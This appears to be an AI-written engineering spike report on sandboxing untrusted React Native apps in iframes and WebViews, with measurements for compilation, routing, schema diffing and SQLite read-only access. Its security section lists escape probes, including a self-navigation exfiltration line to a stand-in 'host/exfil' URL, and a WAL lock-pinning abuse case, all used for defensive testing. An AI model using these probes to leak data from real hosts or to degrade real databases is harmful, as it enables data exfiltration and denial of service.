# M12-01: sandboxed app runtime spike (risk gate)

Ticket: [#142](https://github.com/cucucachu/unnamed_local_ai_server/issues/142).
Prototype and reproduction scripts: [`spikes/app_runtime/`](../../spikes/app_runtime/README.md).
Raw numbers: `spikes/app_runtime/results/*.json`. The design changes that
follow from this spike are folded into [`PLATFORM.md`](../PLATFORM.md) §2 (D11), §5, §7, and §11.

## How this was produced

- Host: Linux x86-64, Node 22.23, Docker, headless Chromium 151 (Playwright 1.62.1). The live compose stack was not touched: everything ran in the spike's own `node_modules`, in throwaway `docker run --rm --network none` containers, and against a stand-in host server (`host/server.mjs`).
- Versions match the frontend: React 19.2.3, react-native-web 0.21.2, Expo SDK 57 (`expo` 57.0.18, react-native 0.86.3). Also esbuild 0.25.12, jsdom 26.1, SQLite 3.46.1 (python:3.12-slim), and sqlite3def 3.11.24.
- **Not run: Expo Go on a phone.** No phone, emulator, or Android SDK was available to the agent. §3 below says exactly what was checked instead, and the [README](../../spikes/app_runtime/README.md#expo-go-manual-maintainer) has a copy-pasteable procedure for the maintainer.

## Verdicts

| # | Item | Verdict | Key numbers |
|---|---|---|---|
| 1 | Compile (esbuild, externals from a prebuilt runtime, import allowlist) | **GO** | Runtime 468,171 B raw / 145,602 B gzip / 123,607 B brotli, built in 0.7 s once per SDK version. App bundle 3,341 B / 1,482 B gzip, compiled in 4.5 ms p50 / 6.7 ms p95 (warm, n=20). Allowlist violations reported as file:line:col (8/8 checks). |
| 2 | Sandboxed iframe on web (plain host and Expo SDK 57 web export) | **GO with changes** (CSP in the sandbox document; host kills a frame that navigates) | Bridge round trip (echo) p50 < 0.1 ms, p95 0.1 ms. `db.getAll` via the host's HTTP RPC p50 1.1 ms, p95 1.6 ms (n=200). Hot reload 4.4 ms from push to re-rendered, route kept. First render 110 ms (plain host) / 158 ms (Expo web host). 34/34 + 11/11 checks. |
| 3 | react-native-webview in Expo Go | **GO with changes, pending the maintainer's device test** | Expo SDK 57 bundles `react-native-webview` **13.16.1**. Same HTML and bridge in a WebView-semantics emulation: 10/10 checks, hot reload 8 ms. The host→sandbox path must be `injectJavaScript`, and navigation must be locked down (see below). |
| 4 | Router shim | **GO: use the shim** | Shim 4,005 B min / 1,965 B gzip. react-navigation would add +188 KB / +60 KB gzip (JS stack) or +131 KB / +46 KB gzip (native-stack on web). |
| 5 | Smoke render with no network | **GO** (jsdom + `react-dom/client`, not `react-dom/server`) | ~75 ms per route, ~285 ms per app including compile, in `node:22-alpine --network none --read-only`. A deliberate throw is reported as `app/item/[id].tsx:14:19` with the source line and component stack. A SQL typo is reported with its SQL. |
| 6 | Schema diffing | **NO-GO for sqlite3def; GO for our own differ** (stdlib Python) | sqlite3def missed 4 of 15 cases silently (and `--check` exited 0 for them) and generated invalid SQL for 3 more. The Python differ classified 15/15 correctly; every failed apply rolled back with data intact. |
| 7 | WAL read-only from a `:ro` mount | **GO with changes: exec gets a published snapshot, never the live file** | Live `mode=ro`: 0 torn reads in 433, but 100% failures after a clean writer shutdown, and a pinned reader grew the WAL 20×. `immutable=1` on the live file: 142/433 "malformed" and 7 torn reads. Snapshot + `immutable=1`: 0 errors or torn reads in any phase, lag ≤ 1 s. |

Neither item 2 nor item 3 is NO-GO, so no architecture escalation is needed.
Item 3 still needs the maintainer's on-device run before G12.

## 1. Compile

**Bundle format.** esbuild compiles `app/**` (plus any helper files in the
app directory) from a generated entry that imports every route file. Output
is `format: 'cjs'`, `target: es2020`, JSX `automatic`, wrapped as:

```js
__homeai_define(function (require, module, exports) { /* app */ });
// exports = { routes: [{ name: 'item/[id]', segments: ['item', '[id]'], component }], layout }
```

The only `require()`s left in the output are the allowlisted modules:
`react`, `react/jsx-runtime`, `react-native`, `expo-router`, `expo-sqlite`, `@homeai/sdk`.
The runtime's `require` refuses anything else too (defense in depth). The
source map is written next to the bundle, for smoke-render diagnostics. It
isn't shipped to the sandbox.

**Runtime bundle** (one IIFE per SDK version, cacheable forever):

| Part | Minified bytes |
|---|---|
| react-native-web 0.21.2 (all exports) | 248,418 |
| react-dom 19.2.3 (`react-dom/client`) | 180,763 |
| react, scheduler, style helpers | ~28,000 |
| runtime: router shim 3,978 + SDK 1,052 + bridge 1,059 + boot/registry 2,140 | 8,274 (incl. module glue) |
| **Total** | **468,171 (145,602 gzip / 123,607 brotli)** |

Exposing only a curated list of 33 RN exports saved just 8.5 KB gzip
(137,081), so expose all of react-native-web. It's simpler, and "RN primitives
only" is enforced at type-check time anyway.

**Allowlist enforcement** is an esbuild plugin (`build/compile-app.mjs`).
It rejects every bare import not on the list (`react-dom`, `fs`, `node:os`,
…) and every relative import that resolves outside the app directory. An
`onLoad` realpath check catches symlinks that escape. esbuild attaches the
import's location, so diagnostics look like:

```json
{ "severity": "error", "code": "import-not-allowed", "file": "app/index.tsx", "line": 2, "column": 30,
  "message": "Import \"react-dom\" is not allowed in apps. Allowed: react, react-native, expo-router, expo-sqlite, @homeai/sdk",
  "lineText": "import { createPortal } from 'react-dom';" }
```

`require('fs')` and imports inside helper files are caught the same way
(`app/index.tsx:6:20`, `lib/helper.ts:1:16`). Route files are validated
before bundling: only `.ts`/`.tsx` in `app/`; segments `name`, `index`,
`[param]`, `[...rest]`; root `_layout` only. `window`/`document` use (D9) is
**not** an esbuild concern. That belongs to the M12 type-check step
(tsconfig `lib` without `dom`, plus the RN/SDK typings).

## 2. Sandbox on web

The host builds one HTML document (`build/sandbox-html.mjs`): CSP `<meta>`,
config, the runtime inline, then the app inline. It sets that as `srcdoc` on
`<iframe sandbox="allow-scripts">`. The same test ran against a plain host
page (`tests/sandbox.e2e.mjs`) and inside a real Expo SDK 57 web export, where
react-native-web renders the iframe (`expo-host/`, `tests/expo-web.e2e.mjs`).

Verified in Chromium:

- **Rendering and navigation:** the index lists rows from `db.getAll`; `Link` goes to `/item/2`; `useLocalSearchParams` returns `{ id: '2' }`; `Stack.Screen` works in both the layout and a screen (dynamic title); `router.back()` and the header back button work; `runAsync` → `db.changed` re-runs `useQuery`; `nav.changed` events reach the host.
- **Escape probes, run inside the sandbox with app-code privileges** (`tests/probes.mjs`):

| Probe | Result |
|---|---|
| `self.origin` | `"null"` (opaque) |
| `document.cookie`, `localStorage`, `sessionStorage`, `indexedDB` | `SecurityError` (sandboxed, lacks allow-same-origin) |
| `parent.document`, `parent.location.href`, `parent.homeHost` | `SecurityError` (cross-origin frame) |
| `top.location = …` | blocked; host URL unchanged |
| `fetch(host + '/api/secret', { credentials: 'include' })`, `fetch` to `/api/rpc/<instance>` | `TypeError: Failed to fetch` |
| no-cors fetch, XHR, WebSocket, image beacon | all fail |
| `window.open` | returns `null` (no allow-popups) |
| requests that reached the host server | **none** (with CSP) |

- **Sandbox attribute without CSP:** the same probes still can't read cookies, storage, or the parent. But six requests *did* reach the server (fetch, no-cors fetch, XHR, WebSocket upgrade, image beacon, all with `Origin: null`). None carried the `SameSite=Lax` session cookie. So the sandbox attribute alone protects credentials but not egress. **The CSP is required** (D9's "no raw fetch" has to be enforced below app code):
  `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'`.
- **Self-navigation (residual risk):** `location.href = 'http://host/exfil?data=…'` from inside the frame *does* send one request (without cookies). Neither sandbox flags nor CSP can block it (`navigate-to` was never shipped). The host detects the frame's second `load` event and removes the frame. So a malicious app can leak data it could already see to a URL, once per open, through the URL itself. Mitigations: D9 type-checking (`location`/`window` don't exist in the app typings), the allowlist, and the load-count kill switch. Native is stricter (see §3). WebRTC-based egress wasn't tested; Chrome's CSP doesn't cover it. Both are listed in PLATFORM §11.
- **RPC latency** (sequential, measured in the sandbox, n=200 after 20 warm-ups):

| Path | p50 | p95 | p99 | max |
|---|---|---|---|---|
| echo, bridge only (plain host) | < 0.1 ms | 0.1 ms | 0.1 ms | 0.2 ms |
| `db.getAll` via host → HTTP → node:sqlite (plain host) | 1.1 ms | 1.6 ms | 2.6 ms | 3.2 ms |
| echo (Expo web host) | < 0.1 ms | 0.1 ms | — | 0.1 ms |
| `db.getAll` (Expo web host) | 1.1 ms | 2.5 ms | — | 4.4 ms |

  (Chromium clamps `performance.now()` to 0.1 ms here, so "< 0.1" means below timer resolution.)
- **Hot reload:** the host posts `bundle.load { code }` while the sandbox is on `/item/1`. The runtime evaluates the new bundle, keeps the navigation stack (router state lives outside the bundle), and re-renders. It took 4.4 ms from push to `runtime.ready` (3.4 ms render), plus 7.3 ms to compile. The host page didn't reload (a marker global survived). Component state isn't preserved (no Fast Refresh), which is acceptable.
- **Viewer role:** the host rejects `db.run` and `action` before forwarding.

## 3. Native WebView (Expo Go)

- `services/frontend/node_modules/expo/bundledNativeModules.json` (expo 57.0.18) pins **`react-native-webview`: `13.16.1`**, alongside `expo-sqlite` `~57.0.2`.
- Findings from reading the 13.16.1 source (`node_modules/react-native-webview`) that change the design:
  - **Page → host:** `window.ReactNativeWebView.postMessage(string)` works on both platforms. It's injected before page scripts (Android `addJavascriptInterface`; iOS a document-start `WKUserScript`), and it takes strings only. That's why the envelope is always a JSON string, on web too.
  - **Host → page:** `webview.postMessage(data)` dispatches the `MessageEvent` on **`document` on Android** (`RNCWebViewManagerImpl.kt`) but on **`window` on iOS** (`RNCWebViewImpl.m`). The runtime therefore ignores MessageEvents when it's top-level, and the host always uses `injectJavaScript("window.__homeaiReceive(<JSON string literal>);true;")`. That path is identical on both platforms.
  - **Navigation:** URLs that fail `originWhitelist` (default `['http://*','https://*']`) are handed to **`Linking.openURL`**, which opens the system browser. That's an exfiltration path. So the host uses `originWhitelist={['*']}`, which hands nothing to `Linking`, plus `onShouldStartLoadWithRequest` that allows only `about:*` (the initial `source={{ html }}` document) and refuses everything else. This is stricter than web: self-navigation is refused before any request goes out.
  - Hardening props used (`expo-host/Sandbox.native.tsx`): `setSupportMultipleWindows={false}`, `javaScriptCanOpenWindowsAutomatically={false}`, `domStorageEnabled={false}`, `incognito`, `cacheEnabled={false}`, `thirdPartyCookiesEnabled={false}`, `sharedCookiesEnabled={false}`, `allowFileAccess*={false}`, `allowUniversalAccessFromFileURLs={false}`, `mixedContentMode="never"`. The native host uses bearer tokens, not WebView cookies, so the WebView holds no credentials either way.
- **What was verified without a device:**
  - `expo-host` (Expo SDK 57 + react-native-webview 13.16.1 + expo-sqlite as the stand-in platform DB) passes `expo install --check`. It type-checks for both `.native` and `.web`. `expo export -p android` builds its Hermes bundle (2.1 MB), and `expo export -p web` builds and passes the Playwright test in §2.
  - `tests/webview-emulation.e2e.mjs` loads the exact HTML the phone gets as a top-level opaque-origin document, with `ReactNativeWebView.postMessage` injected before content. It delivers host messages with the exact `injectScriptFor(env)` string that `Sandbox.native.tsx` uses, and the host is `expo-host/bridgeHost.ts` itself. Result: renders, navigates, writes, hot reloads (8 ms), and ignores Android- and iOS-style MessageEvents. CSP blocks fetch, no-cors fetch, XHR, WebSocket, and image beacons. Latency there (p50 0.7 ms, p95 1.0 ms) includes a CDP round trip and says nothing about a phone.
  - Android's `loadDataWithBaseURL` takes the ~472 KB HTML string without trouble (it has no size limit short of memory). Unverified until the device test.
- **Not verified (maintainer):** real Expo Go rendering, bridge latency on a phone, `onShouldStartLoadWithRequest` blocking, and cookie/storage behavior in Android/iOS WebViews. Procedure: [README → Expo Go](../../spikes/app_runtime/README.md#expo-go-manual-maintainer). Pass criteria: renders and navigates, hot reload keeps the route, bench p95 < 25 ms, probes show every network probe blocked, and no browser opens.

## 4. Router shim

The real expo-router can't run in the sandbox. It depends on Metro's
`require.context` for route discovery, and it pulls in react-navigation,
react-native-screens, and its own linking and head handling. The alternatives
measured:

| Option | Added to runtime (min / gzip) | Notes |
|---|---|---|
| **Shim** (`runtime/router.tsx`) | **4,005 / 1,965 B** | Route table generated at build time; expo-router API surface |
| react-navigation 7 JS stack (`@react-navigation/native` 7.4.1 + `stack` 7.11.2) | 188,341 / 60,411 B | Also needs gesture-handler (web); a different API from expo-router's file routes, which is what the model knows |
| react-navigation native-stack 7.19.2 on web | 131,044 / 45,725 B | Same API mismatch |

**Recommendation: the shim.** It's about 30× smaller, and it keeps the
expo-router conventions the model already knows (D9, "standards over
inventions"). Supported now: `Stack` (+ `Stack.Screen` in the layout for
per-route options, and inside a screen for dynamic options), `Slot`, `Link`
(`href` as string or `{ pathname, params }`, `replace`, `asChild`),
`router`/`useRouter` (`push`, `navigate`, `replace`, `back`, `canGoBack`,
`dismissAll`, `setParams`), `useLocalSearchParams`, `useGlobalSearchParams`,
and `usePathname`. Routes: `index`, static segments, `[param]`, and
`[...rest]`, with static beating dynamic. Unmatched paths render a "not found"
screen. Screens under the top of the stack stay mounted (hidden), so back
navigation keeps their state. Not yet supported (a build diagnostic says so):
`(group)` directories, nested `_layout`, `Tabs`, modals, transitions. Add them
by growing the shim, as D9 already anticipates.

## 5. Smoke render

`smoke/smoke-render.mjs` renders every route. For each route it creates a
fresh jsdom window and evaluates the **real runtime** (dev build) and the
**app bundle** (dev build, source map kept) in it. The bridge talks to an
in-memory `node:sqlite` database created from the app's `schema.sql`, over
the same `ReactNativeWebView.postMessage` / `__homeaiReceive` transport the
phone uses. Dynamic params are filled with `1`. It waits until the runtime is
ready and the RPC traffic has been idle for 50 ms, then collects:

- **render errors**, from the runtime's `ErrorBoundary` (`componentDidCatch` → `runtime.error` with `stack` + `componentStack`) and from window `error`/`unhandledrejection`. Stacks are source-mapped with `@jridgewell/trace-mapping`;
- **SQL errors**, from the stand-in RPC handler;
- React warnings, via jsdom's virtual console.

Result in `docker run --rm --network none --read-only --cap-drop ALL node:22-alpine`, with the spike mounted `:ro` (compile included):

```text
groceries: ok=true totalMs=285 routes=/(75ms) /item/1(74ms)
render-throw: ok=false
  [sql] no such column: nam  sql=SELECT id, nam, done FROM items ORDER BY id
  [render] app/item/[id].tsx:14:19 Cannot read properties of undefined (reading '0')  in ItemScreen (app/item/[id].tsx:8:18)
           source: "const heading = data![0].name.toUpperCase();"
```

Why jsdom + `react-dom/client` rather than `react-dom/server`: SSR never runs
effects, so `useQuery` never resolves. A crash that only happens once data
arrives, and every SQL error, would slip through. The throw above does happen
on first render, so SSR would catch that one, but it would miss the SQL typo.
Limits: each route renders once, in its initial state, against an empty
database. There's no interaction, and `onLayout` never fires (jsdom has no
layout; `ResizeObserver` is stubbed). It's a smoke test, not a test suite.

## 6. Schema diffing

**sqlite3def** 3.11.24 (sqldef). License: MIT, except the parser, which is
Apache-2.0. Both permissive, and both require keeping their notices. A static
linux/amd64 binary is published on every GitHub release
(`sqlite3def_linux_amd64.tar.gz`, 4.1 MB → 9.9 MB, sha256 `736aa432…758f`).
It runs fully offline (`--network none`): `sqlite3def live.sqlite --dry-run < schema.sql`.
The only additive/destructive signal is that DROPs are left out by default
and printed as `-- Skipped: DROP …` lines. They appear as DDL only with
`--enable-drop`. `--check` exits 2 when it thinks there's drift.

The matrix (`schema/cases.py`) ran against a live WAL database containing rows:

| Case | sqlite3def (dry run → apply `--enable-drop`) | Our differ (`schema/pydiff.py`) |
|---|---|---|
| add table | `CREATE TABLE` ✓ | additive ✓ |
| add nullable column / NOT NULL DEFAULT column | `ADD COLUMN` ✓ | additive ✓ |
| add NOT NULL column without default | emits `ADD COLUMN … NOT NULL` → **apply fails** | destructive rebuild with reason "NOT NULL without a default … add a DEFAULT"; apply rolls back |
| add column `REFERENCES lists(id)` | emits `ALTER TABLE … ADD CONSTRAINT … FOREIGN KEY` → **invalid SQLite, apply fails** | additive `ADD COLUMN … REFERENCES` ✓ |
| add index | ✓ | additive ✓ |
| drop index | skipped unless `--enable-drop` | safe (no data loss) ✓ |
| drop column / drop table | skipped unless `--enable-drop` ✓ | destructive, needs approval ✓ |
| type change (`INTEGER` → `TEXT`) | **nothing emitted, `--check` exit 0** | destructive rebuild ✓ |
| add `UNIQUE` | **nothing emitted, `--check` exit 0** | destructive rebuild ✓ |
| nullable → `NOT NULL` | **nothing emitted, `--check` exit 0** | destructive rebuild; fails on NULL rows → rolled back ✓ |
| default change | **nothing emitted, `--check` exit 0** | safe rebuild ✓ |
| rename column | `ADD COLUMN title NOT NULL` + drop → **apply fails** | destructive rebuild + "renames are drop+add" hint ✓ |

**Why sqlite3def is unsuitable:** it silently skips every change that SQLite
can't do with `ALTER` (type, constraints, NOT NULL, defaults), so the live
database drifts from `schema.sql` with no signal. It also emits SQL that
SQLite rejects. Classifying its output would mean re-parsing SQL text anyway.

**Our differ** (about 300 lines of stdlib Python, the same as the platform's
stack):

1. Execute `schema.sql` into a scratch `:memory:` database under a `sqlite3` **authorizer** that allows only CREATE TABLE / CREATE INDEX. `ATTACH`, `INSERT`, `PRAGMA`, triggers, and views are rejected ("not authorized").
2. Compare scratch vs live with `PRAGMA table_xinfo` / `foreign_key_list` / `index_list`, plus each table's CREATE text split into normalized column definitions and table constraints. The text catches COLLATE, CHECK, and so on.
3. Plan per table: in-place `ADD COLUMN` when SQLite allows it; `DROP COLUMN` when the column isn't indexed or a PK; otherwise the standard 12-step rebuild (create `_homeai_new_x` from the desired SQL, copy the common columns, drop, rename, recreate indexes). Each step gets a class and a reason:
   - **additive** (auto): CREATE TABLE, ADD COLUMN, CREATE INDEX;
   - **safe** (auto; snapshot anyway): DROP/replace INDEX, a rebuild that only relaxes (default change, dropping NOT NULL);
   - **destructive** (approval + snapshot): DROP TABLE/COLUMN, a rebuild that retypes or tightens (type, NOT NULL, UNIQUE, CHECK, FK, PK), renames.
4. Apply everything in one `BEGIN IMMEDIATE` transaction with `foreign_keys=OFF`. Then run `PRAGMA foreign_key_check`, **re-diff (it must come out empty)**, and only then COMMIT; otherwise ROLLBACK and return the error as a diagnostic.

15/15 cases were classified as expected. Every apply was idempotent, and the
three that should fail (NOT NULL without default, rename to NOT NULL, tighten
NOT NULL with NULL rows) rolled back with rows intact.

## 7. WAL read-only

A writer container (rw mount; it stands in for the platform) commits about
900 transactions/s. Each transaction inserts a 2 KB row and bumps a counter,
so the invariant `counter.n == count(events)` holds after every commit. It
also runs PASSIVE/TRUNCATE checkpoints and, every 1 s, publishes
`VACUUM INTO` and backup-API snapshots (tmp file → fsync → chmod 0444 →
atomic rename). A reader container uses exec-style hardening (`:ro` mount,
`--read-only`, `--cap-drop ALL`, `--network none`, a different UID) and reads
in a single transaction each time (`wal/run.sh`).

| Mode (reader) | Writer running (433 attempts) | After clean writer exit (-wal/-shm gone) | After writer crash (-wal/-shm left) |
|---|---|---|---|
| `mode=ro` (fresh or long-lived conn) | ✓ 0 torn, lag p50 6.5 ms | ✗ **100% `unable to open database file`** | ✓ |
| `mode=ro&immutable=1` on the live file | ✗ **142 × `database disk image is malformed`, 7 torn reads** | ✓ (stale: ignores the WAL) | ✓ (stale) |
| `VACUUM INTO` snapshot + `immutable=1` | ✓ 0 errors, lag p50 537 / p95 972 ms | ✓ | ✓ |
| backup-API snapshot + `immutable=1` | ✓ 0 errors, lag p50 550 / p95 982 ms | ✓ | ✓ |

**Abuse case** (`wal/pin_reader.py`): an untrusted `mode=ro` reader that
keeps a read transaction open for 9 s. The TRUNCATE checkpoint reported busy,
the WAL grew from 0.84 MB to **16.8 MB (20×)**, and writer throughput fell
from 10.8k to 4.2k transactions per 12 s. A read-only mount doesn't stop
POSIX read locks, so exec code with the live file can degrade the platform.

Snapshot cost grows with database size: `VACUUM INTO` took 0.2 → 46 ms as
the DB grew to 66 MB. Backup API was similar (`results/wal.log`).

**Recommendation:** exec containers never see the live database. When it
issues an exec grant, the platform publishes a snapshot with `VACUUM INTO`
(compacted, consistent, doesn't block the writer in WAL mode). It writes it
to a separate directory, `apps/<instance_id>/ro/data.sqlite` (tmp → fsync →
0444 → rename), and mounts only that directory `:ro`. Exec opens it with
`file:…?mode=ro&immutable=1`. It is refreshed on demand (when a grant is
issued, or when exec asks and the DB changed since), debounced to at most
1 per second. Live `mode=ro` stays unsupported: it fails whenever the
platform has no open connection, and it hands exec a lock it can abuse.

## Recommended design (summary of the PLATFORM.md amendments)

- **Bundle:** esbuild CJS body wrapped in `__homeai_define(function (require, module, exports) {…})`, exporting `{ routes, layout }`. Externals are the allowlist only. The source map is stored with the version artifact.
- **Runtime:** one IIFE per SDK version, about 468 KB / 146 KB gzip: React 19.2.3 + `react-dom/client` + react-native-web 0.21.2 (all exports) + the expo-router shim + `@homeai/sdk` + the `expo-sqlite` shim + the bridge. The sandbox document is CSP meta + config + runtime + app, all inline, used as iframe `srcdoc` on web and WebView `source={{ html }}` on native.
- **Bridge envelope v1** (always a JSON string):
  `{homeai:1, kind:'req', id, method, params}` / `{homeai:1, kind:'res', id, ok, result | error:{code,message}}` / `{homeai:1, kind:'evt', event, data}`.
  - Sandbox → host: `ReactNativeWebView.postMessage(s)` in a WebView, else `parent.postMessage(s, '*')`. The host checks `event.source === iframe.contentWindow`.
  - Host → sandbox: `iframe.contentWindow.postMessage(s, '*')` on web, `injectJavaScript('window.__homeaiReceive(<s as a JS string literal>);true;')` on native.
  - Methods: `db.getAll`, `db.getFirst`, `db.run`, `action`. Events: `db.changed`, `bundle.load`, `space` (host → sandbox); `runtime.ready`, `runtime.error`, `nav.changed` (sandbox → host).
  - The host enforces the method allowlist and viewer read-only mode, and uses a fixed instance id.
- **`withTransactionAsync`** is left out of SDK v1. Doing it over RPC needs a server-side transaction lease. Multi-statement atomic writes go through `runAction` (D16 actions are transactional).
- **Router:** the shim above; the route table is generated at build time.
- **Smoke render:** jsdom + `react-dom/client` + the dev runtime/app builds + an in-memory SQLite from `schema.sql`, in the network-less build container. It returns `render` / `sql` diagnostics with file:line:col and component stack.
- **Migrations:** our own differ (not sqlite3def), with the authorizer, the additive/safe/destructive classes, and transactional apply + re-diff.
- **Exec read-only:** a published `VACUUM INTO` snapshot opened with `immutable=1`, in its own directory; never the live file.
